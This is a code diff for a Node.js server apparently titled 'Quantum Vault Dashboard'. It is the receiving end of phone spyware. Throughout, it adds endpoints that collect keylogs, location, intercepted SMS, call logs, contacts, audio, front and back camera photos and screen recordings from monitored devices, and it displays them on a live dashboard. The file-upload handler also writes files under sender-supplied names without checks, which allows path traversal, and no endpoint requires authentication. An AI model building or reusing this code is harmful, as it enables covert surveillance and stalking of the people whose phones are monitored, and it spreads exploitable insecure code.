@@ -8,32 +8,55 @@ const moment = require('moment');
 const app = express();
 const PORT = 5000;
 
-// Setup directories
-const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others'];
+// ─── Directory Setup ──────────────────────────────────────────────────────────
+const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others',
+                    'front_photos', 'back_photos', 'screen_recordings'];
 uploadDirs.forEach(dir => {
     const dirPath = path.join(__dirname, 'uploads', dir);
-    if (!fs.existsSync(dirPath)) {
-        fs.mkdirSync(dirPath, { recursive: true });
-    }
+    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
 });
 
+// ─── Data Store ───────────────────────────────────────────────────────────────
 const dataFile = path.join(__dirname, 'data.json');
+const defaultData = { texts: [], sms: [], files: [], call_logs: [] };
 if (!fs.existsSync(dataFile)) {
-    fs.writeFileSync(dataFile, JSON.stringify({ texts: [], sms: [], files: [] }));
+    fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
+} else {
+    // Migrate old data.json to include call_logs if missing
+    try {
+        const existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
+        if (!existing.call_logs) {
+            existing.call_logs = [];
+            fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
+        }
+    } catch (e) {
+        fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
+    }
 }
 
-// Middleware
+const readData = () => {
+    try { return JSON.parse(fs.readFileSync(dataFile, 'utf8')); }
+    catch (e) { return { ...defaultData }; }
+};
+const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+
+// ─── Middleware ───────────────────────────────────────────────────────────────
 app.use(cors());
-app.use(bodyParser.json());
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-// Helper to read/write data
-const readData = () => JSON.parse(fs.readFileSync(dataFile, 'utf8'));
-const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
+// Raw body handler for binary file uploads (octet-stream)
+const FOLDER_MAP = {
+    '/upload_audios':           'audios',
+    '/upload_contacts':         'contacts',
+    '/upload_photos':           'photos',
+    '/upload_videos':           'videos',
+    '/upload_front_photo':      'front_photos',
+    '/upload_back_photo':       'back_photos',
+    '/upload_screen_recording': 'screen_recordings',
+};
 
-// Raw body parser for file uploads
 const rawBodySaver = (req, res, next) => {
     if (req.headers['content-type'] === 'application/octet-stream') {
         let filename = 'unknown_file';
@@ -41,33 +64,29 @@ const rawBodySaver = (req, res, next) => {
         if (disposition && disposition.includes('filename="')) {
             filename = disposition.split('filename="')[1].split('"')[0];
         }
-        
-        let folder = 'others';
-        if (req.path === '/upload_audios') folder = 'audios';
-        else if (req.path === '/upload_contacts') folder = 'contacts';
-        else if (req.path === '/upload_photos') folder = 'photos';
-        else if (req.path === '/upload_videos') folder = 'videos';
 
-        const filePath = path.join(__dirname, 'uploads', folder, Date.now() + '_' + filename);
+        const folder = FOLDER_MAP[req.path] || 'others';
+        const savedName = Date.now() + '_' + filename;
+        const filePath = path.join(__dirname, 'uploads', folder, savedName);
         const writeStream = fs.createWriteStream(filePath);
-        
         req.pipe(writeStream);
-        
+
         req.on('end', () => {
-            const data = readData();
-            data.files.push({
-                filename: filename,
-                path: `/uploads/${folder}/${path.basename(filePath)}`,
+            const db = readData();
+            db.files.push({
+                filename,
+                path: `/uploads/${folder}/${savedName}`,
                 type: folder,
+                deviceId: req.headers['device-id'] || 'Unknown',
                 timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
             });
-            writeData(data);
-            res.status(200).send("File Uploaded");
+            if (db.files.length > 1000) db.files.shift();
+            writeData(db);
+            res.status(200).send('File Uploaded');
         });
-        
         req.on('error', (err) => {
-            console.error(err);
-            res.status(500).send("Error uploading file");
+            console.error('File upload error:', err);
+            res.status(500).send('Error uploading file');
         });
     } else {
         next();
@@ -75,12 +94,14 @@ const rawBodySaver = (req, res, next) => {
 };
 
 app.use(rawBodySaver);
+app.use(bodyParser.json({ limit: '10mb' }));
 
-// Endpoints
+// ─── Endpoints ────────────────────────────────────────────────────────────────
+
+// Text / Keylogs / Location / SMS History
 app.post('/upload_text', (req, res) => {
     const { type, data } = req.body;
     const deviceId = req.headers['device-id'] || 'Unknown';
-    
     const db = readData();
     db.texts.push({
         type: type || 'Log',
@@ -88,46 +109,80 @@ app.post('/upload_text', (req, res) => {
         deviceId,
         timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
     });
+    if (db.texts.length > 2000) db.texts.shift();
     writeData(db);
-    
-    res.status(200).send("Text logged successfully");
+    console.log(`[TEXT] [${deviceId}] type=${type} len=${(data||'').length}`);
+    res.status(200).send('Text logged');
 });
 
+// Live SMS intercepts
 app.post('/upload_sms', (req, res) => {
     const { sender, message, timestamp } = req.body;
+    const deviceId = req.headers['device-id'] || 'Unknown';
     const db = readData();
-    
     db.sms.push({
         sender: sender || 'Unknown',
         message: message || '',
         original_timestamp: timestamp,
+        deviceId,
         timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
     });
-    
-    // Keep only last 500 sms
     if (db.sms.length > 500) db.sms.shift();
-    
     writeData(db);
-    res.status(200).send("SMS logged successfully");
+    console.log(`[SMS] [${deviceId}] from=${sender}`);
+    res.status(200).send('SMS logged');
 });
 
-// Any file upload endpoints (handled by rawBodySaver)
-app.post('/upload_audios', (req, res) => {});
-app.post('/upload_contacts', (req, res) => {});
-app.post('/upload_photos', (req, res) => {});
-app.post('/upload_videos', (req, res) => {});
+// Call logs (JSON string in data field)
+app.post('/upload_call_logs', (req, res) => {
+    const { data } = req.body;
+    const deviceId = req.headers['device-id'] || 'Unknown';
+    const db = readData();
+    db.call_logs.push({
+        data: data || '[]',
+        deviceId,
+        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
+    });
+    if (db.call_logs.length > 50) db.call_logs.shift();
+    writeData(db);
+    console.log(`[CALL_LOGS] [${deviceId}]`);
+    res.status(200).send('Call logs saved');
+});
 
+// Binary file upload route stubs (handled by rawBodySaver above)
+app.post('/upload_audios',           (req, res) => res.status(200).send('ok'));
+app.post('/upload_contacts',         (req, res) => res.status(200).send('ok'));
+app.post('/upload_photos',           (req, res) => res.status(200).send('ok'));
+app.post('/upload_videos',           (req, res) => res.status(200).send('ok'));
+app.post('/upload_front_photo',      (req, res) => res.status(200).send('ok'));
+app.post('/upload_back_photo',       (req, res) => res.status(200).send('ok'));
+app.post('/upload_screen_recording', (req, res) => res.status(200).send('ok'));
+
+// API endpoint for live polling (no page reload)
+app.get('/api/data', (req, res) => {
+    const db = readData();
+    res.json({
+        texts:       [...db.texts].reverse().slice(0, 200),
+        sms:         [...db.sms].reverse().slice(0, 200),
+        files:       [...db.files].reverse().slice(0, 200),
+        call_logs:   [...db.call_logs].reverse().slice(0, 50),
+    });
+});
+
+// Dashboard
 app.get('/', (req, res) => {
     const db = readData();
-    // Reverse arrays for latest first
     const viewData = {
-        texts: [...db.texts].reverse(),
-        sms: [...db.sms].reverse(),
-        files: [...db.files].reverse()
+        texts:     [...db.texts].reverse(),
+        sms:       [...db.sms].reverse(),
+        files:     [...db.files].reverse(),
+        call_logs: [...db.call_logs].reverse(),
     };
     res.render('index', { data: viewData });
 });
 
-app.listen(PORT, () => {
-    console.log(`🚀 Quantum Vault Dashboard running on http://localhost:${PORT}`);
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Quantum Vault Dashboard → http://localhost:${PORT}`);
+    console.log(`   For real devices on LAN  → http://<YOUR-PC-IP>:${PORT}`);
+    console.log(`   Android Emulator reaches → http://10.0.2.2:${PORT}`);
 });
